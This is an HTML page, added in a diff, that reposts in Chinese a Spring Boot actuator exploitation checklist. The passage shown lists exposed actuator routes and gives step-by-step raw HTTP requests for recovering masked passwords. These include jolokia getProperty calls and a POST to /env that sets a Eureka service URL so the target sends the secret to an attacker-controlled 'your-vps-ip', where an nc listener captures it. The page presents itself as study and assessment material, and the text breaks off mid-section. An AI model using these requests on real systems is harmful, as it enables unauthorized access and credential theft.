@@ -1,0 +1,3289 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script defer src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script defer src="/assets/js/gta.js"></script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="不得不谈的：「Spring Boot」未授权渗透 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2020/spring-boot-vuln-summary/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;不得不谈的：「Spring Boot」未授权渗透&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/LandGrey&quot; target=&quot;_blank&quot;&gt;
+        LandGrey
+
+        
+            
+            &lt;!-- wrench time--&gt;
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Oct 8, 2022
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;h3 id=&quot;声明&quot;&gt;声明&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit&quot;&gt;这是转载地址&lt;/a&gt;，
+&lt;strong&gt;若作者介意请联系：「administrator@sentrylab.cn」删除转载文章&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;spring-boot-vulnerability-exploit-checklist&quot;&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit&quot; target=&quot;_blank&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/a&gt;&lt;/h4&gt;
+
+&lt;p&gt;Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Bin4xin edited. Source from LandGrey&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;零路由和版本&quot;&gt;零：路由和版本&lt;/h2&gt;
+
+&lt;h3 id=&quot;0x01路由知识&quot;&gt;0x01：路由知识&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Spring Boot 1.x 版本默认内置路由的根路径以  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 开始，2.x 则统一以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator&lt;/code&gt; 开始&lt;/li&gt;
+  &lt;li&gt;有些程序员会自定义 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manage&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/management&lt;/code&gt; 或 &lt;strong&gt;项目相关名称&lt;/strong&gt; 为根路径&lt;/li&gt;
+  &lt;li&gt;默认内置路由名字，如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 有时候也会被程序员修改，如修改成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/appenv&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;0x02版本知识&quot;&gt;0x02：版本知识&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;常见组件的版本相互依赖关系&quot;&gt;常见组件的版本相互依赖关系：&lt;/h4&gt;
+
+&lt;table class=&quot;table&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;依赖项&lt;/th&gt;
+      &lt;th&gt;版本列表及依赖组件版本&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-boot-starter-parent&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent&quot;&gt;spring-boot-starter-parent&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-boot-dependencies&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies&quot;&gt;spring-boot-dependencies&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-cloud-dependencies&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies&quot;&gt;spring-cloud-dependencies&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;spring-cloud-与-spring-boot-大版本之间的依赖关系&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/h4&gt;
+
+&lt;table class=&quot;table&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Spring Cloud&lt;/th&gt;
+      &lt;th&gt;Spring Boot&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Angel&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.2.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Brixton&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.3.x、1.4.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Camden&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.4.x、1.5.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Dalston&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Edgware&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Finchley&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.0.x，不兼容 1.5.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Greenwich&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.1.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Hoxton&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.2.x&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;spring-cloud-小版本号的后缀及含义&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/h4&gt;
+
+&lt;table class=&quot;table&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;版本号后缀&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;BUILD-SNAPSHOT&lt;/td&gt;
+      &lt;td&gt;快照版，代码不是固定，处于变化之中&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MX&lt;/td&gt;
+      &lt;td&gt;里程碑版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RCX&lt;/td&gt;
+      &lt;td&gt;候选发布版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RELEASE&lt;/td&gt;
+      &lt;td&gt;正式发布版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SRX&lt;/td&gt;
+      &lt;td&gt;(修复错误和 bug 并再次发布的)正式发布版&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;一信息泄露&quot;&gt;一：信息泄露&lt;/h2&gt;
+
+&lt;h3 id=&quot;0x01路由地址及接口调用详情泄漏&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;直接访问以下几个路由，验证漏洞是否存在：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api-docs
+/v2/api-docs
+/swagger-ui.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;一些可能会遇到的接口路由变形：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mappings
+/actuator/mappings
+/metrics
+/actuator/metrics
+/beans
+/actuator/beans
+/configprops
+/actuator/configprops
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞&lt;/strong&gt;；&lt;/p&gt;
+
+&lt;p&gt;但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x02配置不当而暴露的路由&quot;&gt;0x02：配置不当而暴露的路由&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;参考 &lt;a href=&quot;https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints&quot;&gt;production-ready-endpoints&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt&quot;&gt;spring-boot.txt&lt;/a&gt;，可能因为配置不当而暴露的默认内置路由可能会有：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/actuator
+/auditevents
+/autoconfig
+/beans
+/caches
+/conditions
+/configprops
+/docs
+/dump
+/env
+/flyway
+/health
+/heapdump
+/httptrace
+/info
+/intergrationgraph
+/jolokia
+/logfile
+/loggers
+/liquibase
+/metrics
+/mappings
+/prometheus
+/refresh
+/scheduledtasks
+/sessions
+/shutdown
+/trace
+/threaddump
+/actuator/auditevents
+/actuator/beans
+/actuator/health
+/actuator/conditions
+/actuator/configprops
+/actuator/env
+/actuator/info
+/actuator/loggers
+/actuator/heapdump
+/actuator/threaddump
+/actuator/metrics
+/actuator/scheduledtasks
+/actuator/httptrace
+/actuator/mappings
+/actuator/jolokia
+/actuator/hystrix.stream
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中对寻找漏洞比较重要接口的有：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；&lt;/p&gt;
+
+    &lt;p&gt;同时有一定概率可以通过 POST 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置一些属性，触发相关 RCE 漏洞。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/trace&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;0x03获取被星号脱敏的密码的明文-方法一&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-jolokia-调用相关-mbean-获取明文&quot;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/h5&gt;
+
+&lt;p&gt;将下面示例中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 键中。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot&lt;/code&gt; Mbean（&lt;strong&gt;可能更通用&lt;/strong&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.cloud.context.environment&lt;/code&gt; Mbean（&lt;strong&gt;需要 spring cloud 相关依赖&lt;/strong&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04获取被星号脱敏的密码的明文-方法二&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-1&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-1&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-1&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;
+
+&lt;p&gt;将下面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://value:${security.user.password}@your-vps-ip&lt;/code&gt;  中的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 换成自己想要获取的对应的星号 * 遮掩的属性名；&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;your-vps-ip&lt;/code&gt; 换成自己外网服务器的真实 ip 地址。&lt;/p&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四-刷新配置&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五-解码属性值&quot;&gt;步骤五： 解码属性值&lt;/h5&gt;
+
+&lt;p&gt;正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; 头内容：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Authorization: Basic dmFsdWU6MTIzNDU2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmFsdWU6MTIzNDU2&lt;/code&gt;部分使用 base64 解码，即可获得类似明文值 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value:123456&lt;/code&gt;，其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123456&lt;/code&gt; 即是目标星号 * 脱敏前的属性值明文。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x05获取被星号脱敏的密码的明文-方法三&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-2&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;通过 POST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 设置属性触发目标对外网指定地址发起任意 http 请求&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-2&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;参考 UUUUnotfound 提出的 &lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/issues/1&quot;&gt;issue-1&lt;/a&gt;，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-2&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求-1&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-触发对外-http-请求&quot;&gt;步骤三： 触发对外 http 请求&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.cloud.bootstrap.location&lt;/code&gt; 方法（&lt;strong&gt;同时适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
